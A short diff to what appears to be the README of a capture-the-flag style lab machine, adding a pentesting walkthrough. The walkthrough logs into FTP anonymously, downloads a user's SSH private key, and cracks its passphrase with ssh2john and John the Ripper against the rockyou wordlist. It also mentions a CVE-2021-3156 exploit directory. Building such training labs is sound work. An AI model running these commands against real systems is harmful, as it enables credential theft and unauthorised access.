@@ -70,6 +70,28 @@ Set up new user
 - `sudo bash -c 'echo "https://www.youtube.com/watch?v=5T5BY1j2MkE" > /home/xpepik/flags.txt'`
 - `sudo chmod 600 /home/xpepik/flags.txt`
 
+Instruction for PENTESTING
+----------
+# GET ssh id_rsa from FTP
+```
+ftp <IP_target>
+username: anonymous
+password: anonymous
+cd .ssh/
+get id_rsa
+exit
+chmod 600 id_rsa
+```
+
+# "Crack" ssh key with John The Ripper
+```
+$ locate ssh2john.py
+$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash 
+$ locate rockyou.txt.gz
+$ gunzip rockyou.txt.gz
+$ john id_rsa.hash -wordlist= rockyou.txt
+```
+
 CVE-2021-3156
 -------------
 - directory contains `hac.c`, `lib.c`, `Makefile`, `README.md`
